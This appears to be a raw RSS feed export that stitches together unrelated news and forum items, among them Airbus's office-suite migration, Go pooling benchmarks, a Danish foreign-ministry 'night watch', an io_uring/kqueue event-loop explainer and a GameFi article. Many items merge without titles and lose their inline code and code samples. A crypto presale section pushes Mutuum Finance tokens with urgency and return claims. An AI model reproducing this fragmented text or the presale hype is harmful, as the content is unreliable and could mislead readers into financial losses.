AWS said customers in regulated industries like banking, fintech and SaaS had asked for additional capabilities to meet business continuity and compliance requirements, specifically the ability to provision standby resources or redirect traffic during unexpected regional disruptions.

Dominating global trade infrastructure through ports, shipping, highways and rail is a central pillar of China’s Belt and Road Initiative. And it’s paying off, with a network of ports providing strategic advantage amid rising global trade tensions.

But this unparalleled influence is also sparking security concerns. Some 14 ports with Chinese majority ownership have been identified as having potential military uses, a fact that has the rest of the world, and particularly the US, concerned.

Airbus began migrating its 100,000-plus workforce from Office to Google Workspace more than seven years ago and it still hasn't completed the switch. The Register: As we exclusively revealed in March 2018, the aerospace giant told 130,000 employees it was ditching Microsoft's productivity tools for Google's cloud-based alternatives. Then-CEO Tom Enders predicted migration would finish in 18 months, a timeline that, in hindsight, was "extremely ambitious," according to Catherine Jestin, Airbus's executive vice president of digital. 

Today, more than two-thirds of Airbus's 150,000 employees have fully transitioned, but significant pockets continue to use Microsoft in parallel. Finance, for example, still relies on Excel because Google Sheets can't handle the necessary file sizes, as some spreadsheets involve 20 million cells. "Some of the limitations was just the number of cells that you could have in one single file. We'll definitely start to remove some of the work," Jestin told The Register.]]></content:encoded></item><item><title>When do Go processes return idle memory back to the OS?</title><link>https://www.reddit.com/r/golang/comments/1p8ovc7/when_do_go_processes_return_idle_memory_back_to/</link><author>/u/DeparturePrudent3790</author><category>dev</category><category>reddit</category><category>go</category><pubDate>Fri, 28 Nov 2025 07:30:40 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[My understanding is after a GC the spans which have no reachable objects are marked as idle and remain with the go process for future allocations.

Recently smart-glasses with cameras like the Meta Ray-bans seem to be getting more popular. As does some people's desire to remove/cover up the recording indicator LED. I wanted to see if there's a way to detect when people are recording with these types of glasses, so a little bit ago I started working this project. I've hit a little bit of a wall though so I'm very much open to ideas!I've written a bunch more on the link (+photos are there), but essentially this uses 2 fingerprinting approaches: 
- retro-reflectivity of the camera sensor by looking at IR reflections. mixed results here.
- wireless traffic (primarily BLE, also looking into BTC and wifi)For the latter, I'm currently just using an ESP32, and I can consistently detect when the Meta Raybans are 1) pairing, 2) first powered on, 3) (less consistently) when they're taken out of the charging case. When they do detect something, it plays a little jingle next to your ear.Ideally I want to be able to detect them when they're in use, and not just at boot. I've come across the nRF52840, which seems like it can follow directed BLE traffic beyond the initial broadcast, but from my understanding it would still need to catch the first CONNECT_REQ event regardless. On the bluetooth classic side of things, all the hardware looks really expensive! Any ideas are appreciated. Thanks!]]></content:encoded></item><item><title>Go Pooling Strategies: sync.Pool vs Generics vs ResettablePool — Benchmarks and Takeaways</title><link>https://www.reddit.com/r/golang/comments/1p8n0y2/go_pooling_strategies_syncpool_vs_generics_vs/</link><author>/u/LearnedByError</author><category>dev</category><category>reddit</category><category>go</category><pubDate>Fri, 28 Nov 2025 05:40:34 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[I have been working on a web photo gallery personal project and playing with various A.I. as programming assistants. I have recently completed all of the features for my first release with most of the code constructed in conjunction with Gemini CLI and a portion from Claude Sonnet 4.5.The vast majority of the code uses stdlib with a few 3rd party packages for SQLite database access and http sessions. The code can generally be broken into two categories: Web Interface and Server (HTMX/Hyperscript using TailwindCSS and DaisyUI served by net/http) and Image Ingestion. The dev process was traditional. Get working code first. If performance is a problem, profile and adjust.The web performance tricks were primarily on the front-end.  and  worked admirably well with bog standard code.The Image Ingestion code is where most of the performance improvement time was spent. It contains a worker pool curated to work as well as possible over different hardware (small to large), a custom  connection pool to over come some performance limitation of the stdlib pool, and heavily leverages sync.Pool to minimize allocation overhead.I asked Copilot in VSCode to perform a Code Review. I was a bit surprised with its result. It was quite good. Many of the issues that it identified, like insufficient negative testing, I expected.I did not expect it to recommend replacing my use of sync.Pool with generic versions for type safety and possible performance improvement. My naive pre-disposition has been to "not" use generics where performance is a concern. Nonetheless, this raised my curiosity. I asked Copilot to write benchmarks to compare the implementations.The benchmark implementations are:Interface-based  using pointer indirection (e.g., , , ).Generics-based pools:  storing values (e.g.,  by value). storing pointers (e.g., , ).A minimal  abstraction (calls  automatically on ) versus generic pointer pools, for types that can cheaply reset.Link to benchmarks below.Interface pointer ()Generic value slice ()Interface pointer ()Generic value slice ()galleryImage (RGBA 1920x1080)galleryImage (RGBA 1920x1080)galleryImage (RGBA 1920x1080)galleryImage (RGBA 1920x1080)These benchmarks were run on my dev server: Intel(R) Xeon(R) CPU E5-2680 v3 @ 2.50GHz (Linux, Go on amd64).For slices, a generic value pool () incurs allocations (value copy semantics). Prefer interface pointer pools () or a generic pointer pool to avoid allocations.For pointer types (, ), both interface and generic pointer pools are allocation-free and perform similarly.For  (Resettable), both approaches are zero-alloc; minor speed differences were observed - not significantFor large/complex objects ( which is image.Image wrapped in a struck), a generic pointer pool was ~2× faster than  in these tests, likely due to reduced interface overhead and reset work pattern.go test -bench . -benchmem -run '^$' go test -bench 'BufPool' -benchmem -run '^$' go test -bench 'BufferPool' -benchmem -run '^$' go test -bench 'Null(String|Int64)Pool_(GetPut|Parallel)$' -benchmem -run '^$' go test -bench 'MD5_(GetPut|Parallel)$' -benchmem -run '^$' go test -bench 'GalleryImage_(GetPut|Parallel)$' -benchmem -run '^$' Pools are powerful. Details matter! Use pointer pools. Avoid value slice pools. Expect parity across strategies (interface/generic) for pointer to small types. Generic may be faster is the type is large. And as always, benchmark your actual workloads. Relative performance can shift with different reset logic and usage patterns.I hope you find this informative.

This shift was unthinkable just a few years ago in the Islamic Republic. The 2022 death of Mahsa Amini and the protests that followed have fueled this change. Despite calls from hard-liners for stricter enforcement, Iran's leadership seems to be avoiding the issue for now.

From a report: Under the agreement, which was signed on Thursday, the federal government will scrap a planned emissions cap on the oil and gas sector and drop rules on clean electricity in exchange for a commitment by Canada's top oil-producing province to strengthen industrial carbon pricing and support a carbon capture-and-storage project. 

The deal, which was hailed by the country's oil industry but panned by environmentalists, signaled a shift in Canada's energy policy in favour of fossil fuel development and is already creating tensions within Carney's minority government. Steven Guilbeault, who served as environment minister under Carney's predecessor Justin Trudeau, said he was quitting the cabinet over concerns that Canada's climate plan was being dismantled.]]></content:encoded></item><item><title>Black Friday Reminder For Those Hating Ads But Loving Linux Hardware/Software</title><link>https://www.phoronix.com/news/Black-Friday-2025</link><author>Michael Larabel</author><category>tech</category><pubDate>Fri, 28 Nov 2025 05:00:01 +0000</pubDate><source url="https://www.phoronix.com/">Phoronix</source><content:encoded><![CDATA[As the one and last friendly reminder, if you enjoy the daily and original content found on Phoronix.com but not liking ads and wanting to view multi-page articles on a single page, native dark mode, and more: the 2025 Black Friday / Cyber Week deal is ending Monday to help support the site while enjoying a discounted rate...]]></content:encoded></item><item><title>Vulkan 1.4.335 Released With The Very Notable VK_EXT_present_timing</title><link>https://www.phoronix.com/news/Vulkan-1.4.335-Released</link><author>Michael Larabel</author><category>tech</category><pubDate>Fri, 28 Nov 2025 05:00:00 +0000</pubDate><source url="https://www.phoronix.com/">Phoronix</source><content:encoded><![CDATA[Vulkan 1.4.335 released a few hours ago as the latest iteration of this high performance graphics and compute API.

GPUs, CPUs, memory, PCIe/NVLink all have different “distances.” Bad placement can waste 30–50% performance.Traditional scheduling isn’t enough. Kubernetes normally just counts GPUs. It doesn’t understand NUMA, PCIe trees, NVLink rings, or network topology.Topology-Aware Scheduling fixes this. The scheduler becomes aware of full hardware layout so it can place pods where GPUs and NICs are closest.DRA (Dynamic Resource Allocation) These let Kubernetes make smarter placement choices.Simple single-GPU jobs → normal scheduling is fine.Multi-GPU or distributed training → topology-aware scheduling gives big performance gains   submitted by    /u/Electronic_Role_5981 ]]></content:encoded></item><item><title>Denmark sets up ‘night watch’ to monitor American threats to seize Greenland</title><link>https://www.theguardian.com/world/2025/nov/27/denmark-sets-up-night-watch-to-monitor-trump-since-greenland-row</link><author>/u/jaymar01</author><category>news</category><category>reddit</category><pubDate>Fri, 28 Nov 2025 03:22:40 +0000</pubDate><source url="https://www.reddit.com/r/europe/top/?sort=top&amp;t=day&amp;limit=10">News - Reddit - Europe</source><content:encoded><![CDATA[The Danish government has set up a “night watch” in the foreign ministry, not to keep out the wildlings and White Walkers like the Night’s Watch of Game of Thrones, but rather to monitor Donald Trump’s pronouncements and movements while Copenhagen sleeps.The night watch starts at 5pm local time each day and at 7am a report is produced and distributed around the Danish government and relevant departments about what was said and took place, the Politiken newspaper reported.The position is understood to have been introduced in the aftermath of the diplomatic row between Copenhagen and Washington over Greenland this spring, when the US president threatened to take control of the Arctic island.Politiken said the initiative was one of several examples of how Danish diplomacy and the country’s civil service have had to adapt to the new reality of the second Trump administration.A source close to the foreign office told the Guardian: “It is fair to say that the situation in Greenland and the time difference between Denmark and the United States was quite an important factor introducing this arrangement during the spring.”Rather than everybody having to reach immediately for their phones to catch up on news from the US, the foreign office said it had instead made a “collective effort” to stay updated on Trump.Jacob Kaarsbo, a former chief analyst at the Danish defence intelligence agency, said the development showed, “as we have always known”, that the idea that the US was Denmark’s largest and most important ally was dead. “Alliances are built on common values and a common threat perception,” Kaarsbo said. “Trump shares neither of those with us and I would argue he doesn’t share it with most Europeans.”]]></content:encoded></item><item><title>How Black Friday became a global phenomenon | DW News</title><link>https://www.youtube.com/shorts/7SvUcU-JQ8A</link><author>DW News</author><category>news&quot;</category><enclosure url="https://www.youtube.com/v/7SvUcU-JQ8A?version=3" length="" type=""/><pubDate>Fri, 28 Nov 2025 03:00:16 +0000</pubDate><source url="https://www.youtube.com/channel/UCknLrEdhRCp1aegoMqRaCZg">News - DW</source><content:encoded><![CDATA[Is your phone blowing up with Black Friday deals?

From a report: USPTO Director John Squires said on Wednesday in a notice set to be published Friday, that the office considers generative AI systems to be "analogous to laboratory equipment, computer software, research databases, or any other tool that assists in the inventive process." 

"They may provide services and generate ideas, but they remain tools used by the human inventor who conceived the claimed invention," the office said. "When one natural person is involved in creating an invention with the assistance of AI, the inquiry is whether that person conceived the invention under the traditional conception standard." 

The office reiterated its guidance from last year that AI itself cannot be considered an inventor under U.S. patent law. However, it rejected the approach taken by the PTO during former President Joe Biden's administration for deciding when AI-assisted inventions are patentable, which relied on a standard normally used to determine when multiple people can qualify as joint inventors.]]></content:encoded></item><item><title>Residents living near Hong Kong high rise shelter in mall | REUTERS</title><link>https://www.youtube.com/shorts/dU5eWiza1jE</link><author>Reuters</author><category>news</category><enclosure url="https://www.youtube.com/v/dU5eWiza1jE?version=3" length="" type=""/><pubDate>Fri, 28 Nov 2025 02:19:04 +0000</pubDate><source url="https://www.youtube.com/channel/UChqUTb7kYRX8-EiaN3XFrSQ">News - Reuters </source><content:encoded><![CDATA[Residents from a housing estate next to the Hong Kong high-rise blaze took shelter in a shopping mall, worried the flames would continue to spread.

[...] Social media has become rife with financial scams, and MEPs pushed hard to hold both Big Tech and banks liable during legislative negotiations.

In History looks at how an unassuming cartoonist built a billion-dollar empire out of the lives of a group of children, a dog and a bird.Charles M Schulz's timeless creation Charlie Brown may have been as popular as any character in all of literature, but the cartoonist was modest about the scope of his miniature parables. In a 1977 BBC interview, he said: "I'm talking only about the minor everyday problems in life. Leo Tolstoy dealt with the major problems of the world. I'm only dealing with why we all have the feeling that people don't like us."  This did not mean that he felt as if he was dealing with trivial matters. He said: "I'm always very much offended when someone asks me, 'Do I ever do satire on the social condition?' Well, I do it almost every day. And they say, 'Well, do you ever do political things?' I say, 'I do things which are more important than politics. I'm dealing with love and hate and mistrust and fear and insecurity.'"  WATCH: 'Cartooning is drawing funny pictures whether they're silly or rather meaningful political cartoons'.While Charlie Brown may have been the eternal failure, the universal feelings that Schulz channelled helped make Peanuts a global success. Born in 1922, Schulz drew every single Peanuts strip himself from 1950 until his death in February 2000. It was so popular that Nasa named two of the modules in its May 1969 Apollo 10 lunar mission after Charlie Brown and Snoopy. The strip was syndicated in more than 2,600 newspapers worldwide, and inspired films, music and countless items of merchandise. Part of its success, according to the writer Umberto Eco, was that it worked on different levels. He wrote: "Peanuts charms both sophisticated adults and children with equal intensity, as if each reader found there something for himself, and it is always the same thing, to be enjoyed in two different keys. Peanuts is thus a little human comedy for the innocent reader and for the sophisticated." Schulz's initial reason for focusing on children in the strip was strictly commercial. In 1990, he told the BBC: "I always hate to say it, but I drew little kids because this is what sold. I wanted to draw something, I didn't know what it was, but it just seemed as if whenever I drew children, these were the cartoons that editors seemed to like the best. And so, back in 1950, I mailed a batch of cartoons to New York City, to United Features Syndicate, and they said they liked them, and so ever since I've been drawing little kids."  ]]></content:encoded></item><item><title>Hong Kong fire death toll rises to 65 | DW News</title><link>https://www.youtube.com/shorts/8lOL4r7GukA</link><author>DW News</author><category>news&quot;</category><enclosure url="https://www.youtube.com/v/8lOL4r7GukA?version=3" length="" type=""/><pubDate>Fri, 28 Nov 2025 00:00:18 +0000</pubDate><source url="https://www.youtube.com/channel/UCknLrEdhRCp1aegoMqRaCZg">News - DW</source><content:encoded><![CDATA[The death toll of an apartment block fire rose to 65 it constitutes one of the deadliest blazes in the city's modern history.

We’ll start with blocking
I/O, explore io_uring and kqueue, and take home an event loop very
similar to some software you may find familiar.When you want to read from a file you might  and
then call  as many times as necessary to fill a
buffer of bytes from the file. And in the opposite direction, you call
 as many times as needed until everything is
written. It’s similar for a TCP client with sockets, but instead of
 you first call  and then
 to your server. Fun stuff.In the real world though you can’t always read everything you want
immediately from a file descriptor. Nor can you always write everything
you want immediately to a file descriptor.You can switch
a file descriptor into non-blocking mode so the call won’t block
while data you requested is not available. But system calls are still
expensive, incurring context switches and cache misses. In fact,
networks and disks have become so fast that these costs can start to
approach the cost of doing the I/O itself. For the duration of time a
file descriptor is unable to read or write, you don’t want to waste time
continuously retrying read or write system calls.So you switch to io_uring on Linux or kqueue on FreeBSD/macOS. (I’m
skipping the generation of epoll/select users.) These APIs let you
submit requests to the kernel to learn about readiness: when a file
descriptor is ready to read or write. You can send readiness requests in
batches (also referred to as queues). Completion events, one for each
submitted request, are available in a separate queue.Being able to batch I/O like this is especially important for TCP
servers that want to multiplex reads and writes for multiple connected
clients.However in io_uring, you can even go one step further. Instead of
having to call  or  in userland
after a readiness event, you can request that the kernel do the
 or  itself with a buffer you
provide. Thus almost all of your I/O is done in the kernel, amortizing
the overhead of system calls.If you haven’t seen io_uring or kqueue before, you’d probably like an
example! Consider this code: a simple, minimal, not-production-ready TCP
echo server.This is a great, minimal example. But notice that this code ties
io_uring behavior directly to business logic (in this case, handling
echoing data between request and response). It is fine for a small
example like this. But in a large application you might want to do I/O
throughout the code base, not just in one place. You might not want to
keep adding business logic to this single loop.Instead, you might want to be able to schedule I/O and pass a
callback (and sometimes with some application context) to be called when
the event is complete.The interface might look like:This is great! Now your business logic can schedule and handle I/O no
matter where in the code base it is.Under the hood it can decide whether to use io_uring or kqueue
depending on what kernel it’s running on. The dispatch can also batch
these individual calls through io_uring or kqueue to amortize system
calls. The application no longer needs to know the details.Additionally, we can use this wrapper to stop thinking about
readiness events, just I/O completion. That is, if we dispatch a read
event, the io_uring implementation would actually ask the kernel to read
data into a buffer. Whereas the kqueue implementation would send a
“read” readiness event, do the read back in userland, and then call our
callback.And finally, now that we’ve got this central dispatcher, we don’t
need spaghetti code in a loop switching on every possible submission and
completion event.Every time we call io_uring or kqueue we both submit event requests
and poll for completion events. The io_uring and kqueue APIs tie these
two actions together in the same system call.To sync our requests to io_uring or kqueue we’ll build a
 function that submits requests and polls for
completion events. (In the next section we’ll talk about how the user of
the central dispatch learns about completion events.)To make  more convenient, we’ll build a nice
wrapper around it so that we can submit as many requests (and process as
many completion events) as possible. To avoid accidentally blocking
indefinitely we’ll also introduce a time limit. We’ll call the wrapper
.Finally we’ll put the user in charge of setting up a loop to call
this  function, independent of normal program
execution.This is now your traditional event loop.You may have noticed that in the API above we passed a callback. The
idea is that after the requested I/O has completed, our callback should
be invoked. But the question remains: how to track this callback between
the submission and completion queue?Thankfully, io_uring and kqueue events have user data fields. The
user data field is opaque to the kernel. When a submitted event
completes, the kernel sends a completion event back to userland
containing the user data value from the submission event.We can store the callback in the user data field by setting it to the
callback’s pointer casted to an integer. When the completion for a
requested event comes up, we cast from the integer in the user data
field back to the callback pointer. Then, we invoke the callback.As described above, the struct for 
could get quite large handling all the different kinds of I/O events and
their arguments. We could make our API a little more expressive by
creating wrapper functions for each event type.So if we wanted to schedule a read function we could call:One more thing we need to worry about is that the batch we pass to
io_uring or kqueue has a fixed size (technically, kqueue allows any
batch size but using that might introduce unnecessary allocations). So
we’ll build our own queue on top of our I/O abstraction to keep track of
requests that we could not immediately submit to io_uring or kqueue.To keep this API simple we could allocate for each entry in the
queue. Or we could modify the  calls slightly
to accept a struct that can be used in an intrusive
linked list to contain all request context, including the callback.
The latter is what
we do in TigerBeetle.Put another way: every time code calls ,
we’ll try to immediately submit the requested event to io_uring or
kqueue. But if there’s no room, we store the event in an overflow
queue.The overflow queue needs to be processed eventually, so we update our
 function (described in Callbacks and context above) to pull
as many events from our overflow queue before submitting a batch to
io_uring or kqueue.We’ve now built something similar to libuv, the I/O library that
Node.js uses. And if you squint, it is basically TigerBeetle’s I/O
library! (And interestingly enough, TigerBeetle’s I/O code was adopted
into Bun! Open-source for the win!)Let’s check out how the Darwin
version of TigerBeetle’s I/O library (with kqueue) differs from the
Linux
version. As mentioned, the complete  call in the
Darwin implementation waits for file descriptor readiness (through
kqueue). Once ready, the actual  call is made back in
userland:Compare this to the Linux
version (with io_uring) where the kernel handles everything and
there is no send system call in userland:Similarly, take a look at  on Linux
and macOS
for event processing. Look at  on Linux
and macOS
for the public API users must call. And finally, look at what puts this
all into practice, the loop calling  in
src/main.zig.We’ve come this far and you might be wondering — what about
cross-platform support for Windows? The good news is that Windows also
has a completion based system similar to io_uring but without batching,
called IOCP.
And for bonus points, TigerBeetle provides the same
I/O abstraction over it! But it’s enough to cover just Linux and
macOS in this post. :)In both this blog post and in TigerBeetle, we implemented a
single-threaded event loop. Keeping I/O code single-threaded in
userspace is beneficial (whether or not I/O processing is
single-threaded in the kernel is not our concern). It’s the simplest
code and best for workloads that are not embarrassingly parallel. It is
also best for determinism, which is integral to the design of
TigerBeetle because it enables us to do Deterministic Simulation
TestingBut there are other valid architectures for other workloads.For workloads that are embarrassingly parallel, like many web
servers, you could instead use multiple threads where each thread has
its own queue. In optimal conditions, this architecture has the highest
I/O throughput possible.But if each thread has its own queue, individual threads can become
starved if an uneven amount of work is scheduled on one thread. In the
case of dynamic amounts of work, the better architecture would be to
have a single queue but multiple worker threads doing the work made
available on the queue.Hey, maybe we’ll split this out so you can use it too. It’s written
in Zig so we can easily expose a C API. Any language with a C foreign
function interface (i.e. every language) should work well with it. Keep
an eye on our GitHub.

The price has slipped toward the lower end of its range, and many analysts now warn that ETH could be on track for another drop if support fails. At the same time, a new DeFi crypto token priced at $0.035 is gaining strong attention, climbing 250% from early levels and approaching a full Phase 6 sellout. As Ethereum loses momentum, the shift in interest toward Mutuum Finance is becoming harder to ignore.Ethereum Faces Strong ResistanceEthereum trades near $2,795 with a market cap of about $329B. The chart has been weakening for several weeks. Heavy resistance is stacked between $3,300 and $3,450, with a second resistance zone close to $3,800. ETH has tested these levels multiple times, but each attempt ended with strong rejection. The pressure above remains intense.Support near $2,700 is now critical. Many analysts say that if this level breaks, Ethereum could slide toward the $2,150 to $2,200 region. That scenario would represent a deeper correction that matches the trend seen in previous cycles. With BTC slowing and sentiment dipping across the market, this outcome has become more likely.Ethereum’s size also limits its upside. With a market cap above $300B, large % gains require massive inflows. Many investors searching for the best crypto to buy now are starting to look away from large assets and toward smaller tokens that offer higher growth potential. Some price models predict that ETH may only see a 5% to 15% bounce in the near term, which is far from attractive for traders aiming for strong returns entering Q2 and Q3 2025.This stagnant outlook has pushed attention toward early stage tokens that still have room to grow. Mutuum Finance is now one of the fastest rising projects in that category. is developing a decentralized lending and borrowing protocol built around chain liquidity and collateral backed loans. The platform uses a Peer to Contract model where users deposit assets into a shared pool and receive mtTokens in return. These mtTokens increase in value as borrowers pay interest, giving depositors predictable APY without complex tracking.Borrowers access funds using clear Loan to Value rules. If the collateral becomes unsafe, the system triggers liquidations. Liquidators repay part of the debt and receive collateral at a discount. This keeps the protocol healthy and protects lenders during volatile conditions.Mutuum Finance also confirmed an important milestone through its  account. The team stated that the V1 protocol is scheduled for launch on the Sepolia Testnet in Q4 2025. The post noted that Halborn Security is reviewing the lending and borrowing contracts and that the code is finalized. V1 will include the liquidity pool, mtTokens, the debt token and the liquidation bot. ETH and USDT will be the first supported assets. This early delivery provides strong confidence for investors looking for what crypto to invest in with real development behind it.Presale Growth Shows Rapid AccelerationThe MUTM presale has been one of the most active in 2025. The token entered the market at $0.01 and rose to $0.035 as each phase sold out. That is a 250% climb driven by constant demand. The project has raised about $18.85M, brought in more than 18,100 holders and sold around 805M tokens. Out of the total 4B supply, about 45.5% is allocated to the presale.Phase 6 is now close to 100% allocation. Only a very small amount of tokens remain at $0.035, and traders expect them to sell out soon. This tight supply has created urgent activity as investors rush to secure the final low entry point. Many traders searching for the best crypto to invest in or cheap crypto with strong upside are moving fast before the price increases again.The 24 hour leaderboard adds fuel to the rush. The top contributor each day receives $500 worth of MUTM. Large buyers often compete for this reward, which raises daily volume and accelerates the presale pace. Card payments are also active, making the process easier for new participants.Ethereum continues to face heavy resistance and weakening momentum. Analysts warn that ETH may drop below $2,600 if support breaks. With limited upside in the near term, many top crypto investors are shifting their attention toward early stage tokens that offer more room for growth.Mutuum Finance has emerged as one of the strongest new options. With a nearly complete Phase 6 sellout, a 250% presale climb, a working V1 on the way and a full security review in progress, the project is gaining serious traction. Only a small amount of allocation remains at $0.035. When it sells out, the next price increase takes effect. For investors looking for the best crypto to buy before the next cycle, the final stage of the Mutuum Finance presale may be the last chance to secure the lowest entry point before 2026.For more information about Mutuum Finance (MUTM) visit the links below::::tip

Quttera today announced major enhancements to its Web Malware Scanner API that transform static security scanning into automated compliance evidence. The update introduces real-time evidence streaming and compliance mapping, directly addressing the manual burden of audit preparation that costs organizations 30-40 hours per audit cycle.Automating the Manual Evidence ChaseOrganizations preparing for SOC 2, ISO 27001, and PCI DSS v4.0 audits traditionally spend dozens of hours manually collecting security evidence—exporting reports, capturing screenshots, and mapping findings to compliance controls. This approach creates outdated evidence, doesn't scale across frameworks, and fails to prove continuous monitoring."Security teams are exhausted by the manual 'evidence chase' required before every audit," said Michael Novofastovsky, CTO of Quttera. "We're transforming malware detection into 'Evidence-as-Code'—structured, real-time security data that flows automatically into compliance workflows. Whether organizations use Drata, Vanta, or custom GRC systems, our API provides continuous proof without human intervention."Quttera's API converts threat detection into structured JSON with embedded compliance metadata, mapping findings to controls across SOC 2 (CC6.1, CC7.2), PCI DSS v4.0 (Requirements 6.4.3, 11.6.1), ISO 27001, and GDPR simultaneously.Addressing PCI DSS v4.0's New RequirementsThe update specifically targets PCI DSS v4.0 requirements mandatory since March 2025, particularly Requirements 6.4.3 (script authorization on payment pages) and 11.6.1 (file integrity monitoring). These requirements demand continuous automated detection—capabilities manual processes cannot provide at scale."PCI DSS v4.0 requires real-time detection of unauthorized changes to payment scripts," Novofastovsky explained. "Our API provides timestamped evidence that monitoring is active 24/7, changes are detected automatically, and controls are continuously validated."AI-Powered Threat IntelligenceThe Threat Encyclopedia addresses the context gap security teams face when responding to detections. Integrated directly into scan reports, it provides:Technical breakdown of malware behaviorBusiness impact and risk classificationStep-by-step remediation guidanceConnections to known attack campaigns"We're automating both sides of the problem," said Novofastovsky. "The API handles compliance proof. The Threat Encyclopedia handles operational response. Together, they eliminate manual evidence collection and research overhead."The Encyclopedia currently documents 80+ web malware categories, with AI-assisted expansion based on emerging threats.Automated Control Mapping: Detections tagged for multiple compliance frameworks simultaneouslyReal-Time Evidence Streaming: Continuous JSON feeds replace static PDF reportsBehavioral Detection: Heuristic scanning identifies zero-day and polymorphic threatsIntegration Flexibility: Works with existing GRC platforms via standard REST APIEnhanced capabilities are available immediately to all Quttera API subscribers.Quttera provides automated website security and malware detection solutions, delivering compliance-ready evidence for organizations across financial services, healthcare, e-commerce, and technology sectors. Its comprehensive suite includes advanced heuristic scanning, blacklist monitoring, and remediation services, helping businesses worldwide protect their digital assets and reputation.:::tip

In October, during one of the hottest days of the year, the Bureau of Meteorology (BOM) revealed its new web site and was immediately castigated for doing so. Complaints ranged from a confusing layout to not being able to find information. Farmers were particularly incensed when they found out they could no longer input GPS coordinates to find forecasts for a specific location. When it was revealed the cost of this update was A$96.5 million ($62.3 million), 20 times the original cost estimate, the temperature got even hotter. 

With more than 2.6 billion views a year, Bom tried to explain that the site's refresh -- prompted by a major cybersecurity breach in 2015 -- was aimed at improving stability, security and accessibility. It did little to satisfy the public. Some frustrated users turned to humour: "As much as I love a good game of hide and seek, can you tell us where you're hiding synoptic charts or drop some clues?" 

Malcolm Taylor, an agronomist in Victoria, told the Australian Broadcasting Corporation (ABC) that the redesign was a complete disaster. "I'm the person who needs it and it's not giving me the information I need," the plant and soil scientist said. As psychologist and neuroscientist Joel Pearson put it, "First you violate expectations by making something worse, then you compound the injury by revealing the violation was both expensive and avoidable. It's the government IT project equivalent of ordering a renovation, discovering the contractor has made your house less functional, and then learning they charged you for a mansion."]]></content:encoded></item><item><title>Bitrise Mobile Report: New Benchmarks &amp; 28% Faster Build Times</title><link>https://hackernoon.com/bitrise-mobile-report-new-benchmarks-and-28percent-faster-build-times?source=rss</link><author>Bitrise</author><category>tech</category><pubDate>Thu, 27 Nov 2025 20:50:14 +0000</pubDate><source url="https://hackernoon.com/">Tech - HackerNoon</source><content:encoded><![CDATA[The Bitrise Mobile Insights 2025 report (analyzing 10M+ builds) reveals that while mobile CI pipelines are 23% more complex, leading teams cut build times by 28% through automation like build caching.

The shift strengthens transparency, ownership, and verifiable logic across connected ecosystems already forming around new Web3 infrastructure.Convergence of Decentralized Finance and Game-Based EconomiesThe concept of decentralized DeFi and gaming reflects a growing movement where financial protocols and game environments function inside shared frameworks. GameFi models allow players to earn, trade, or stake assets rather than limit participation to entertainment alone. These structures create digital economies with transferable, user-owned resources.Tokenized items introduce scarcity and verifiable ownership, allowing characters, skins, or in-game tools to exist as NFTs managed on-chain. Players maintain custody of their items rather than depend on central servers. This change supports a stronger foundation for long-term asset value across multiple platforms.The connection also brings new roles for economic tools. Users can expand the utility of their assets across connected platforms thanks to the staking, lending, and liquidity functions. As assets can be transferred across different blockchain ecosystems, the value flow is enhanced by further improving cross-game interoperability.Growing Utility Through Transparent and Portable In-Game AssetsThe structure of GameFi relies on the tokenized items as the building blocks of open economies. Players earn rewards and can funnel these rewards into different DeFi channels for increased financial utility. This creates a rewarding loop as users are incentivized to engage in the activity of the game while also accessing decentralized markets.Liquidity is enhanced as users are able to utilize their NFTs or tokens as collateral without having to sell their assets Borrowing systems allow them to access additional resources or expand their presence in game environments while maintaining ownership. The outcome helps both developers and users as the market expands.Cross-chain environments also are important. Digital assets are enabled moving beyond the original game and into the associated game, resulting in valuable assets in different experiences. This strengthens the ecosystem to stay in motion and supports developers to create assets with a longer perceived cycle of value.On-Chain Strategy Game Built on the Nexus zkVMA Web3 studio building a large-scale strategy title adopted the Nexus zkVM to ensure fair and transparent gameplay. The team needed verifiable randomness for battles, item drops, and resource processes while preserving scalability. Traditional structures were not able to support these requirements at the desired speed.The zkVM allowed complete x game logic to run efficiently. Each action produced a zero-knowledge proof confirming the integrity of results. Players could check the fairness of outcomes without exposing sensitive data or risking exploits inside the environment.The ecosystem was further extended with the in-game assets being tokenized and linked to the Nexus DEX. The economy of the game was connected to DeFi by liquid pools of rare items, allowing the staking and borrowing of items. The activity level rose tremendously when the users got involved in the gameplay and financial mediums within a single environment.Autonomous On-Chain Agents for DeFi Portfolio ManagementA DeFi fund explored automated methods for managing portfolios but encountered issues linked to centralized bots and opaque logic. The team required transparent execution with verifiable processes to maintain trust among participants. Nexus provided a structure that could meet those needs.Fund used the agency model to distribute completely autonomous agents fully on-chain. These agents managed portfolio rebalancing, risk evaluation, trade execution, and the Nexus DEX. Each of these actions led to a proof of action occurring and that the action was performed properly and in accordance with request parameters. The model not only led to lower operational implementation costs by eliminating centralized infrastructure but also drastically increased performance through continuous execution.The model allowed investors access to verifiable logs to evaluate progress, as opposed to opaque summaries (the investors had to trust us that all was done properly). The model improved mutual trust and convicted a more transparent operating model that maximized acceptable risks in a sustainable way as investors adopted long-term models.Kamirai's Dual-Utility Architecture for Web3 and Console Markets.Kamirai pursued a major initiative to build an institutional-quality DEX with a full console gaming release. The Kamirex platform addresses liquidity fragmentation in major Asian markets and operates as a high-throughput exchange built on a proprietary structure. Its token powers governance, trading rebates, premium data access, and staking features.The second component of the ecosystem focuses on a AAA Action-RPG that is a confirmed release that will take place on the major console systems. The main currency of the economy of the game is the Kamirai token. It allows purchasing items, in-game exchange, authenticating the digital assets, and voting on development decisions.The architecture uses controlled supply reduction tied to both Kamirex activity and gaming purchases. Transaction fees and high-value game actions feed the burn model. This framework seeks to build steady demand through financial usage and mainstream entertainment channels rather than market speculation.Research Advancements Supporting Emerging Digital EconomiesThe recent research analyses how intelligent agents are used within GameFi spaces. These agents can manage resources, respond to market changes, or assist users through automated decisions. Their actions are still transparent because each one relates to an on-chain process.Another proposed model, ServerFi, provides a different dimension of user rewards in gaming economies. Instead of only earning value through play tasks, players earn value when they take part in the wider ecosystem processes, with the goal being a more balanced reward cycle.Also, researchers are developing lending models that allow players to borrow tokens to access certain modes or levels in the game, with payback occurring through future value, thus enabling even greater participation. All models capture both accessibility and a finance normalization model in a consistent and verifiable manner.Cross-Chain Marketplaces and Expanding InteroperabilityThe third sector connected  Decentralized DeFi and Gaming involves large-scale asset marketplaces. Developers across different chains face challenges linking their items into unified platforms. Nexus developed a solution by building a 